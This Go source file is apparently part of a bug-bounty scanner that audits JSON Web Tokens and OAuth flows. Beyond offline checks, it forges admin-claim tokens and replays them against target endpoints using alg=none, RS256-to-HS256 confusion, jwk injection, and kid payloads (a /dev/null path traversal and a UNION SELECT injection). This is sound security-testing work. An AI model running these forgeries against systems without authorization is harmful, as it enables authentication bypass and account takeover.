package scanner

import (
	"context"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"hash"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/secret"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

// JWTScanner audits JSON Web Tokens and OAuth flows — a high-value bug-bounty
// class that is almost entirely provable OFFLINE:
//
//   - alg=none: a token issued with "alg":"none" (or one the server accepts with
//     the signature stripped) means anyone can forge any identity → auth bypass.
//   - Weak HMAC secret: if an HS256/384/512 token's signature verifies against a
//     common secret, the signing key is known → we can mint an admin token. This
//     is CONFIRMED with confidence 100 without a single extra request.
//   - Sensitive claims: passwords / card / SSN / API keys inside the (public,
//     base64) payload are an information-disclosure finding.
//   - Missing / far-future expiry: a token that never expires is a lasting risk.
//
// When identities are configured, it additionally PROVES an alg=none bypass live:
// forge an unsigned copy of a real session token and replay it against an endpoint
// the real token is authorized on; if access is still granted, the server does not
// verify signatures. OAuth authorize endpoints are checked for the implicit flow
// and a missing state parameter (token leakage / CSRF).
type JWTScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewJWTScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *JWTScanner {
	return &JWTScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

// NOTE: jwtWeakSecrets and sensitiveClaims() are shared with the exposure module
// (defined in exposure.go) — reused here rather than redeclared.

func (s *JWTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "jwt", "Auditing JWTs + OAuth flows...")

	tokens := s.collectJWTs(ctx, targetID)
	logFn("info", "jwt", fmt.Sprintf("Found %d distinct JWT(s) to analyse.", len(tokens)))

	found := 0
	seenFinding := map[string]bool{}
	for _, tk := range tokens {
		if ctx.Err() != nil {
			break
		}
		for _, iss := range analyzeJWT(tk) {
			key := iss.kind + "|" + iss.detail
			if seenFinding[key] {
				continue
			}
			seenFinding[key] = true
			url := "jwt://" + shortToken(tk)
			s.store(targetID, "jwt", iss.severity, url, iss.kind, iss.evidence, iss.confidence)
			found++
			logFn("warn", "jwt", fmt.Sprintf("JWT issue [%s %d%%]: %s", iss.severity, iss.confidence, iss.detail))
		}
	}

	// Active alg=none bypass proof (needs a JWT-bearing identity + a protected URL).
	if n := s.proveAlgNoneBypass(ctx, targetID, logFn); n > 0 {
		found += n
	}
	// RS256->HS256 algorithm confusion, kid header injection, and embedded-jwk
	// header injection: the three highest-impact JWT bug classes from real
	// bug-bounty write-ups that alg=none proof alone does not cover.
	if n := s.proveAlgConfusionBypass(ctx, targetID, logFn); n > 0 {
		found += n
	}
	if n := s.proveKidInjectionBypass(ctx, targetID, logFn); n > 0 {
		found += n
	}
	if n := s.proveJWKInjectionBypass(ctx, targetID, logFn); n > 0 {
		found += n
	}

	// OAuth passive checks over discovered authorize endpoints.
	found += s.auditOAuth(ctx, targetID, logFn)

	logFn("info", "jwt", fmt.Sprintf("JWT/OAuth audit done. %d issue(s).", found))
	return nil
}

// ── JWT parsing / crypto (pure) ─────────────────────────────────────────────

// looksLikeJWT reports whether s is a well-formed JWT: three base64url parts, the
// first of which decodes to a JSON object carrying an "alg".
func looksLikeJWT(s string) bool {
	s = strings.TrimSpace(s)
	parts := strings.Split(s, ".")
	if len(parts) != 3 || parts[0] == "" || parts[1] == "" {
		return false
	}
	hdr, ok := b64urlJSON(parts[0])
	if !ok {
		return false
	}
	_, has := hdr["alg"]
	return has
}

func b64urlJSON(part string) (map[string]any, bool) {
	raw, err := base64.RawURLEncoding.DecodeString(part)
	if err != nil {
		// tolerate padded variants
		if raw, err = base64.URLEncoding.DecodeString(part); err != nil {
			return nil, false
		}
	}
	var m map[string]any
	if json.Unmarshal(raw, &m) != nil {
		return nil, false
	}
	return m, true
}

// decodeJWT returns the header and payload objects of a token.
func decodeJWT(token string) (header, payload map[string]any, ok bool) {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 {
		return nil, nil, false
	}
	h, ok1 := b64urlJSON(parts[0])
	p, ok2 := b64urlJSON(parts[1])
	if !ok1 || !ok2 {
		return nil, nil, false
	}
	return h, p, true
}

func jwtAlg(header map[string]any) string {
	if a, ok := header["alg"].(string); ok {
		return a
	}
	return ""
}

func hmacHashFor(alg string) func() hash.Hash {
	switch strings.ToUpper(alg) {
	case "HS256":
		return sha256.New
	case "HS384":
		return sha512.New384
	case "HS512":
		return sha512.New
	}
	return nil
}

// hmacSecretMatches reports whether an HS* token's signature verifies with secret.
func hmacSecretMatches(token, secret string) bool {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 {
		return false
	}
	hdr, ok := b64urlJSON(parts[0])
	if !ok {
		return false
	}
	newHash := hmacHashFor(jwtAlg(hdr))
	if newHash == nil {
		return false
	}
	mac := hmac.New(newHash, []byte(secret))
	mac.Write([]byte(parts[0] + "." + parts[1]))
	want := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(want), []byte(strings.TrimRight(parts[2], "=")))
}

// bruteHS256 tries the weak-secret list against a token; returns the secret if one
// verifies its signature (i.e. the token is forgeable).
func bruteHS256(token string, secrets []string) (string, bool) {
	for _, sec := range secrets {
		if hmacSecretMatches(token, sec) {
			return sec, true
		}
	}
	return "", false
}

// forgeAlgNone rebuilds a token with an unsigned "alg":"none" header, preserving
// the original payload. Used to test whether the server verifies signatures.
func forgeAlgNone(token string) string {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 {
		return ""
	}
	hdr := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	return hdr + "." + parts[1] + "."
}

// forgeHS re-signs a token (optionally with mutated claims) using a known secret —
// the proof that a weak/known key means arbitrary token minting.
func forgeHS(token, secret string, mutate map[string]any) string {
	hdr, payload, ok := decodeJWT(token)
	if !ok {
		return ""
	}
	alg := jwtAlg(hdr)
	if hmacHashFor(alg) == nil {
		alg = "HS256"
		hdr["alg"] = "HS256"
	}
	for k, v := range mutate {
		payload[k] = v
	}
	hb, _ := json.Marshal(hdr)
	pb, _ := json.Marshal(payload)
	h64 := base64.RawURLEncoding.EncodeToString(hb)
	p64 := base64.RawURLEncoding.EncodeToString(pb)
	mac := hmac.New(hmacHashFor(alg), []byte(secret))
	mac.Write([]byte(h64 + "." + p64))
	return h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

// ── Offline analysis ────────────────────────────────────────────────────────

type jwtIssue struct {
	kind       string
	severity   string
	detail     string
	evidence   string
	confidence int
}

// analyzeJWT runs every offline check against a single token.
func analyzeJWT(token string) []jwtIssue {
	hdr, payload, ok := decodeJWT(token)
	if !ok {
		return nil
	}
	var out []jwtIssue
	alg := strings.ToUpper(jwtAlg(hdr))

	// alg=none — an unsigned token in circulation.
	if alg == "NONE" || alg == "" {
		out = append(out, jwtIssue{
			kind: "alg_none", severity: "high", confidence: ConfCandidateHi,
			detail:   "Unsigned alg=none JWT observed; live acceptance needs replay proof",
			evidence: "Token header alg=" + jwtAlg(hdr) + " and the token is unsigned. This is a high-signal candidate, not yet an auth-bypass finding; the active verifier separately replays an alg=none forgery against a protected endpoint. Candidate token: " + forgeAlgNone(token),
		})
	}

	// Weak HMAC secret — full forgery, confirmed offline.
	if strings.HasPrefix(alg, "HS") {
		if sec, hit := bruteHS256(token, jwtWeakSecrets); hit {
			forged := forgeHS(token, sec, map[string]any{"role": "admin", "admin": true})
			out = append(out, jwtIssue{
				kind: "weak_secret", severity: "critical", confidence: ConfPoC,
				detail:   fmt.Sprintf("JWT %s signed with a weak/known secret %q — token forgery", alg, sec),
				evidence: fmt.Sprintf("The token's signature verifies with secret=%q, so arbitrary tokens can be minted. Proof — a forged admin token: %s", sec, forged),
			})
		}
	}

	// Asymmetric algorithm + a kid claim is the precondition for RS256->HS256
	// algorithm confusion and kid-injection key-lookup attacks; flag it even
	// when no protected-URL fixture is available yet for the active prover to
	// use below.
	if (strings.HasPrefix(alg, "RS") || strings.HasPrefix(alg, "ES") || strings.HasPrefix(alg, "PS")) && hdr["kid"] != nil {
		out = append(out, jwtIssue{
			kind: "asymmetric_alg_kid_candidate", severity: "info", confidence: ConfHiddenCutoff,
			detail:   fmt.Sprintf("JWT uses asymmetric alg=%s with a kid claim", alg),
			evidence: "Asymmetric signing plus a key-id claim is the precondition for RS256->HS256 algorithm confusion and kid-injection attacks; the active verifier separately attempts both against a protected endpoint.",
		})
	}
	// A token that carries its own verification key is only safe if the server
	// ignores it in favor of its own trusted key material.
	if hdr["jwk"] != nil {
		out = append(out, jwtIssue{
			kind: "embedded_jwk_candidate", severity: "medium", confidence: ConfCandidateHi,
			detail:   `JWT header embeds its own "jwk" public key`,
			evidence: "A jwk header is only safe if the server ignores it in favor of its own trusted key; the active verifier separately tests whether an attacker-supplied jwk is honored.",
		})
	}

	// Remote key URLs are attack surface, not proof. Merely carrying jku/x5u is
	// valid JOSE behavior; only a forged-token acceptance or an OAST callback can
	// prove key injection/SSRF. Preserve the lead as a hidden/info candidate.
	for _, key := range []string{"jku", "x5u"} {
		if value, ok := hdr[key].(string); ok && strings.TrimSpace(value) != "" {
			out = append(out, jwtIssue{
				kind: key + "_header_candidate", severity: "info", confidence: ConfHiddenCutoff,
				detail:   fmt.Sprintf("JWT %s header references a remote key URL", key),
				evidence: fmt.Sprintf("%s=%q observed. This is not a vulnerability by itself; verify strict allow-listing with a controlled forged-key/OAST test.", key, value),
			})
		}
	}

	// Sensitive claims in the (readable) payload — reuse the exposure module's list.
	if leaked := sensitiveClaims(payload); len(leaked) > 0 {
		out = append(out, jwtIssue{
			kind: "sensitive_claims", severity: "medium", confidence: ConfEvidence,
			detail:   "JWT payload carries sensitive claim(s): " + strings.Join(leaked, ", "),
			evidence: "The JWT payload is base64 — NOT encrypted. These claims are readable by anyone holding the token: " + strings.Join(leaked, ", "),
		})
	}

	// Expiry hygiene.
	if _, has := payload["exp"]; !has {
		out = append(out, jwtIssue{
			kind: "no_expiry", severity: "low", confidence: ConfCandidateHi,
			detail:   "JWT has no exp claim — the token never expires",
			evidence: "No exp claim: a leaked token is valid forever.",
		})
	} else if exp, ok := claimFloat(payload["exp"]); ok {
		if ttl := time.Until(time.Unix(int64(exp), 0)); ttl > 365*24*time.Hour {
			out = append(out, jwtIssue{
				kind: "long_expiry", severity: "low", confidence: ConfCandidateHi,
				detail:   fmt.Sprintf("JWT expiry is very far in the future (~%d days)", int(ttl.Hours()/24)),
				evidence: "An excessively long-lived token widens the window of a leak.",
			})
		}
	}
	return out
}

func claimFloat(v any) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case json.Number:
		f, err := n.Float64()
		return f, err == nil
	}
	return 0, false
}

// ── Collection + active proof + OAuth ───────────────────────────────────────

// collectJWTs gathers candidate tokens from configured identities (Authorization
// / Cookie headers) and from discovered parameter values.
func (s *JWTScanner) collectJWTs(ctx context.Context, targetID string) []string {
	seen := map[string]bool{}
	var out []string
	add := func(t string) {
		t = strings.TrimSpace(t)
		parts := strings.Split(t, ".")
		if t != "" && looksLikeJWT(t) && !isDemoJWT(parts) && !seen[t] {
			seen[t] = true
			out = append(out, t)
		}
	}
	for _, id := range LoadIdentities(ctx, s.db, targetID, secret.New(s.cfg.SessionSecret)) {
		for k, v := range id.Headers {
			switch strings.ToLower(k) {
			case "authorization":
				add(strings.TrimPrefix(strings.TrimPrefix(v, "Bearer "), "bearer "))
			case "cookie":
				for _, c := range strings.Split(v, ";") {
					if i := strings.IndexByte(c, '='); i >= 0 {
						add(c[i+1:])
					}
				}
			}
		}
	}
	rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT value FROM parameters WHERE target_id=? AND value LIKE '%.%.%' LIMIT 2000`, targetID)
	if err == nil {
		for rows.Next() {
			var v string
			if rows.Scan(&v) == nil {
				add(v)
			}
		}
		rows.Close()
	}
	return out
}

// findBearerJWT locates a configured identity whose Authorization header
// carries a JWT, plus a short list of alive endpoints that identity's real
// token might be authorized on — the fixture every active JWT-forgery proof
// below replays against. Shared so alg=none, algorithm-confusion, kid-
// injection, and jwk-injection proofs don't each re-derive it.
func (s *JWTScanner) findBearerJWT(ctx context.Context, targetID string) (bearer *Identity, token string, urls []string) {
	ids := LoadIdentities(ctx, s.db, targetID, secret.New(s.cfg.SessionSecret))
	for i := range ids {
		if raw := strings.TrimPrefix(strings.TrimPrefix(ids[i].Headers["Authorization"], "Bearer "), "bearer "); looksLikeJWT(raw) {
			bearer = &ids[i]
			token = raw
			break
		}
	}
	if bearer == nil {
		return nil, "", nil
	}
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services WHERE target_id=? AND status_code BETWEEN 200 AND 399 ORDER BY url LIMIT 25`, targetID)
	if err != nil {
		return bearer, token, nil
	}
	for rows.Next() {
		var u string
		if rows.Scan(&u) == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	return bearer, token, urls
}

// replayForgedBypass is shared by every active JWT-forgery proof: send forged
// as the Authorization bearer against each candidate URL and confirm only
// when (a) the real token is authorized there, (b) an unauthenticated request
// is denied (so the endpoint is actually access-controlled), and (c) the
// forged token reaches the SAME object as the real one — never a bare "not a
// 401", which is what makes this a proof rather than a guess.
func (s *JWTScanner) replayForgedBypass(ctx context.Context, targetID, kind, forged string, bearer *Identity, urls []string, note string) int {
	if forged == "" {
		return 0
	}
	attacker := Identity{Label: kind, Headers: map[string]string{"Authorization": "Bearer " + forged}}
	for _, u := range urls {
		if ctx.Err() != nil {
			break
		}
		authed := fetchAs(ctx, u, bearer)
		if !looksLikeAuthObject(authed) {
			continue
		}
		if !deniesAccess(fetchAs(ctx, u, nil)) {
			continue // not access-controlled
		}
		forgedResp := fetchAs(ctx, u, &attacker)
		if looksLikeAuthObject(forgedResp) && bodiesSameObject(authed.Body, forgedResp.Body) {
			ev := fmt.Sprintf("%s CONFIRMED at %s. %s Forged token: %s", kind, u, note, forged)
			s.store(targetID, "jwt", "critical", u, kind, ev, ConfPoC)
			return 1
		}
	}
	return 0
}

// proveAlgNoneBypass forges an unsigned copy of a real session token and replays
// it against an endpoint the real token is authorized on. Access still granted ⇒
// the server does not verify signatures — a confirmed auth bypass.
func (s *JWTScanner) proveAlgNoneBypass(ctx context.Context, targetID string, logFn LogFunc) int {
	bearer, token, urls := s.findBearerJWT(ctx, targetID)
	if bearer == nil {
		return 0
	}
	forged := forgeAlgNone(token)
	n := s.replayForgedBypass(ctx, targetID, "alg_none_bypass", forged, bearer, urls,
		"The real token grants access; an unsigned (alg=none) forgery of it ALSO grants the same object; no token is denied. The server does not verify JWT signatures.")
	if n > 0 {
		logFn("warn", "jwt", "JWT alg=none bypass CONFIRMED")
	}
	return n
}

// jwkKey is a minimal JSON Web Key (RSA) as found in a JWKS document.
type jwkKey struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type jwkSet struct {
	Keys []jwkKey `json:"keys"`
}

// jwksHTTPClient is a short-timeout, credential-free client used only to fetch
// PUBLIC JWKS documents for the algorithm-confusion proof below — it never
// attaches a captured Authorization/Cookie header.
var jwksHTTPClient = &http.Client{Timeout: 8 * time.Second}

func fetchJSON(ctx context.Context, rawURL string, out any) bool {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Reconner/1.0)")
	resp, err := jwksHTTPClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return false
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return false
	}
	return json.Unmarshal(body, out) == nil
}

// discoverJWKS best-effort fetches the target's JSON Web Key Set from already-
// discovered service URLs (…jwks…) and, via the OIDC discovery document, its
// jwks_uri. Used only to obtain PUBLIC key material for the RS256->HS256
// confusion proof — never to exfiltrate anything.
func (s *JWTScanner) discoverJWKS(ctx context.Context, targetID string) []jwkKey {
	rows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url FROM http_services
		WHERE target_id=? AND status_code BETWEEN 200 AND 299
		  AND (url LIKE '%jwks%' OR url LIKE '%.well-known/openid-configuration%')
		LIMIT 20`, targetID)
	if err != nil {
		return nil
	}
	var candidates []string
	for rows.Next() {
		var u string
		if rows.Scan(&u) == nil {
			candidates = append(candidates, u)
		}
	}
	rows.Close()

	var keys []jwkKey
	for _, u := range candidates {
		if ctx.Err() != nil {
			break
		}
		if strings.Contains(u, ".well-known/openid-configuration") {
			var doc struct {
				JWKSURI string `json:"jwks_uri"`
			}
			if fetchJSON(ctx, u, &doc) && doc.JWKSURI != "" {
				var set jwkSet
				if fetchJSON(ctx, doc.JWKSURI, &set) {
					keys = append(keys, set.Keys...)
				}
			}
			continue
		}
		var set jwkSet
		if fetchJSON(ctx, u, &set) {
			keys = append(keys, set.Keys...)
		}
	}
	return keys
}

// rsaPublicKeyPEM builds the PEM encoding real-world JWT libraries expect when
// a caller mistakenly resolves "the verification key" the same way for both
// RS256 and HS256 — PKIX DER, PEM-wrapped. That confusion is the root cause of
// the RS256->HS256 attack: HMAC-signing with these exact bytes as the secret.
func rsaPublicKeyPEM(pub *rsa.PublicKey) (string, error) {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return "", err
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})), nil
}

// jwkToRSAPublicKey reconstructs an RSA public key from its JWK (n, e) fields.
func jwkToRSAPublicKey(k jwkKey) (*rsa.PublicKey, bool) {
	if !strings.EqualFold(k.Kty, "RSA") || k.N == "" || k.E == "" {
		return nil, false
	}
	nb, err := base64.RawURLEncoding.DecodeString(k.N)
	if err != nil {
		return nil, false
	}
	eb, err := base64.RawURLEncoding.DecodeString(k.E)
	if err != nil {
		return nil, false
	}
	e := 0
	for _, b := range eb {
		e = e<<8 | int(b)
	}
	if e == 0 {
		return nil, false
	}
	return &rsa.PublicKey{N: new(big.Int).SetBytes(nb), E: e}, true
}

// x5cToRSAPublicKey extracts the RSA public key embedded in a token's own x5c
// (certificate chain) header — the most direct source of the server's public
// key, requiring no extra network request.
func x5cToRSAPublicKey(header map[string]any) (*rsa.PublicKey, bool) {
	chain, ok := header["x5c"].([]any)
	if !ok || len(chain) == 0 {
		return nil, false
	}
	certB64, ok := chain[0].(string)
	if !ok {
		return nil, false
	}
	der, err := base64.StdEncoding.DecodeString(certB64)
	if err != nil {
		return nil, false
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return nil, false
	}
	pub, ok := cert.PublicKey.(*rsa.PublicKey)
	return pub, ok
}

// forgeHMACWithKeyString re-signs token's claims (mutated) with alg downgraded
// to HS256, using keyStr's raw bytes as the HMAC secret — the RS256->HS256
// algorithm-confusion forgery.
func forgeHMACWithKeyString(token, keyStr string, mutate map[string]any) string {
	hdr, payload, ok := decodeJWT(token)
	if !ok {
		return ""
	}
	hdr["alg"] = "HS256"
	delete(hdr, "x5c")
	delete(hdr, "jku")
	delete(hdr, "x5u")
	for k, v := range mutate {
		payload[k] = v
	}
	hb, _ := json.Marshal(hdr)
	pb, _ := json.Marshal(payload)
	h64 := base64.RawURLEncoding.EncodeToString(hb)
	p64 := base64.RawURLEncoding.EncodeToString(pb)
	mac := hmac.New(sha256.New, []byte(keyStr))
	mac.Write([]byte(h64 + "." + p64))
	return h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

// proveAlgConfusionBypass forges a real RS/ES/PS-signed token as HS256, HMAC-
// signed with the server's own asymmetric PUBLIC key bytes (from the token's
// x5c header, or the target's discovered JWKS) — the classic RS256->HS256
// algorithm-confusion attack. A library that resolves "the verification key"
// generically, without pinning the expected algorithm, HMAC-verifies this
// forgery against the very same public key it uses to verify real tokens.
func (s *JWTScanner) proveAlgConfusionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
	bearer, token, urls := s.findBearerJWT(ctx, targetID)
	if bearer == nil || len(urls) == 0 {
		return 0
	}
	hdr, _, ok := decodeJWT(token)
	if !ok {
		return 0
	}
	alg := strings.ToUpper(jwtAlg(hdr))
	if !strings.HasPrefix(alg, "RS") && !strings.HasPrefix(alg, "ES") && !strings.HasPrefix(alg, "PS") {
		return 0 // only meaningful against asymmetric algorithms
	}

	var keyStrings []string
	if pub, ok := x5cToRSAPublicKey(hdr); ok {
		if key, err := rsaPublicKeyPEM(pub); err == nil {
			keyStrings = append(keyStrings, key)
		}
	}
	kid, _ := hdr["kid"].(string)
	for _, k := range s.discoverJWKS(ctx, targetID) {
		if kid != "" && k.Kid != "" && k.Kid != kid {
			continue
		}
		if pub, ok := jwkToRSAPublicKey(k); ok {
			if key, err := rsaPublicKeyPEM(pub); err == nil {
				keyStrings = append(keyStrings, key)
			}
		}
	}
	if len(keyStrings) == 0 {
		return 0 // no public key material discovered — nothing to confuse with
	}

	for _, keyStr := range keyStrings {
		if ctx.Err() != nil {
			break
		}
		forged := forgeHMACWithKeyString(token, keyStr, map[string]any{"role": "admin", "admin": true})
		if n := s.replayForgedBypass(ctx, targetID, "jwt_alg_confusion", forged, bearer, urls,
			"The real token verifies as an asymmetric algorithm; an HS256 forgery HMAC-signed with the server's own public key ALSO verifies — the server resolves its verification key without pinning the expected algorithm."); n > 0 {
			logFn("warn", "jwt", "JWT RS256->HS256 algorithm-confusion bypass CONFIRMED")
			return n
		}
	}
	return 0
}

// proveKidInjectionBypass tests whether the "kid" (Key ID) header is used to
// look up verification key material without sanitizing it: a path-traversal
// kid redirects a filesystem-backed lookup to a predictable, empty file; a
// SQL-injection-shaped kid redirects a database-backed lookup to an
// attacker-chosen literal. Either lets the attacker choose the verification
// key outright.
func (s *JWTScanner) proveKidInjectionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
	bearer, token, urls := s.findBearerJWT(ctx, targetID)
	if bearer == nil || len(urls) == 0 {
		return 0
	}
	if hdr, _, ok := decodeJWT(token); !ok || hdr["kid"] == nil {
		return 0 // no kid claim in circulation — nothing to inject into
	}

	attempts := []struct {
		kind string
		kid  string
		key  string
		note string
	}{
		{
			kind: "jwt_kid_path_traversal",
			kid:  "../../../../../../../../dev/null",
			key:  "",
			note: `kid traversed to /dev/null (read as an empty key) and the token was HMAC-signed with an empty secret — the server resolves "kid" as an unsanitized filesystem path.`,
		},
		{
			kind: "jwt_kid_sqli",
			kid:  "nonexistent-key' UNION SELECT 'reconner-kid-sqli-proof",
			key:  "reconner-kid-sqli-proof",
			note: `kid carried a UNION-SELECT payload whose injected literal is the exact secret the forgery was signed with — the server resolves "kid" via an unsanitized database lookup.`,
		},
	}

	for _, a := range attempts {
		if ctx.Err() != nil {
			break
		}
		hdr, payload, ok := decodeJWT(token)
		if !ok {
			continue
		}
		hdr["kid"] = a.kid
		hdr["alg"] = "HS256"
		payload["role"] = "admin"
		payload["admin"] = true
		hb, _ := json.Marshal(hdr)
		pb, _ := json.Marshal(payload)
		h64 := base64.RawURLEncoding.EncodeToString(hb)
		p64 := base64.RawURLEncoding.EncodeToString(pb)
		mac := hmac.New(sha256.New, []byte(a.key))
		mac.Write([]byte(h64 + "." + p64))
		forged := h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
		if n := s.replayForgedBypass(ctx, targetID, a.kind, forged, bearer, urls, a.note); n > 0 {
			logFn("warn", "jwt", "JWT kid-injection bypass CONFIRMED ("+a.kind+")")
			return n
		}
	}
	return 0
}

// proveJWKInjectionBypass tests whether the server trusts an attacker-supplied
// public key EMBEDDED IN THE TOKEN ITSELF (the "jwk" header) instead of using
// its own configured key material: sign with a throwaway private key generated
// for this one check, hand the server the matching public key in the header,
// and see if it verifies happily against a key that was generated seconds ago
// and is held only by this scan.
func (s *JWTScanner) proveJWKInjectionBypass(ctx context.Context, targetID string, logFn LogFunc) int {
	bearer, token, urls := s.findBearerJWT(ctx, targetID)
	if bearer == nil || len(urls) == 0 {
		return 0
	}
	hdr, payload, ok := decodeJWT(token)
	if !ok {
		return 0
	}
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return 0
	}
	hdr["alg"] = "RS256"
	delete(hdr, "x5c")
	delete(hdr, "x5u")
	delete(hdr, "jku")
	hdr["jwk"] = map[string]any{
		"kty": "RSA",
		"kid": "reconner-jwk-injection-proof",
		"n":   base64.RawURLEncoding.EncodeToString(priv.PublicKey.N.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(priv.PublicKey.E)).Bytes()),
	}
	payload["role"] = "admin"
	payload["admin"] = true
	hb, _ := json.Marshal(hdr)
	pb, _ := json.Marshal(payload)
	h64 := base64.RawURLEncoding.EncodeToString(hb)
	p64 := base64.RawURLEncoding.EncodeToString(pb)
	digest := sha256.Sum256([]byte(h64 + "." + p64))
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, digest[:])
	if err != nil {
		return 0
	}
	forged := h64 + "." + p64 + "." + base64.RawURLEncoding.EncodeToString(sig)
	n := s.replayForgedBypass(ctx, targetID, "jwt_jwk_header_injection", forged, bearer, urls,
		`The token's own "jwk" header carried an attacker-generated public key, signed with the matching attacker-held private key — the server verified the signature against the EMBEDDED key instead of its own trusted key material.`)
	if n > 0 {
		logFn("warn", "jwt", "JWT jwk-header-injection bypass CONFIRMED")
	}
	return n
}

// auditOAuth flags OAuth authorize endpoints using the implicit flow or missing a
// state parameter — token-leakage and CSRF risks respectively.
func (s *JWTScanner) auditOAuth(ctx context.Context, targetID string, logFn LogFunc) int {
	rows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url FROM parameters WHERE target_id=? AND (url LIKE '%authorize%' OR url LIKE '%/oauth%' OR url LIKE '%/connect/%')
		LIMIT 500`, targetID)
	if err != nil {
		return 0
	}
	seen := map[string]bool{}
	found := 0
	for rows.Next() {
		var raw string
		if rows.Scan(&raw) != nil {
			continue
		}
		u, err := url.Parse(raw)
		if err != nil {
			continue
		}
		q := u.Query()
		if q.Get("client_id") == "" && q.Get("response_type") == "" && q.Get("redirect_uri") == "" {
			continue // not really an OAuth authorize request
		}
		base := u.Host + u.Path
		if seen[base] {
			continue
		}
		seen[base] = true

		if rt := strings.ToLower(q.Get("response_type")); strings.Contains(rt, "token") {
			s.store(targetID, "oauth", "medium", raw, "response_type",
				"OAuth implicit flow (response_type="+q.Get("response_type")+") — the access token is returned in the URL fragment, where it leaks via history, Referer, and logs. Use the authorization-code flow with PKCE.", ConfEvidence)
			found++
		}
		if q.Get("state") == "" && q.Get("redirect_uri") != "" {
			s.store(targetID, "oauth", "medium", raw, "state",
				"OAuth authorize request has no state parameter — the flow is not CSRF-protected (authorization-code injection / login CSRF).", ConfCandidateHi)
			found++
		}
	}
	rows.Close()
	if found > 0 {
		logFn("warn", "jwt", fmt.Sprintf("OAuth: %d flow issue(s) flagged.", found))
	}
	return found
}

func shortToken(t string) string {
	if len(t) > 24 {
		return t[:24]
	}
	return t
}

func (s *JWTScanner) store(targetID, typ, sev, url, param, evidence string, confidence int) string {
	weight := map[string]int{"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 1}[sev]
	if weight == 0 {
		weight = 1
	}
	verdict := CandDetected
	if confidence >= ConfEvidence {
		verdict = VerifyVerified
	}
	ids, _ := RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: typ, Severity: sev, URL: url, Method: "GET",
		Parameter: param, Location: "token", Evidence: evidence, Source: "jwt",
		DetectionMethod: param, Confidence: confidence, Priority: confidence * weight,
		Verdict: verdict,
	})
	if s.broadcast != nil && verdict == VerifyVerified {
		s.broadcast("new_vuln_finding", map[string]any{"target_id": targetID, "type": typ, "url": url})
	}
	return ids.FindingID
}
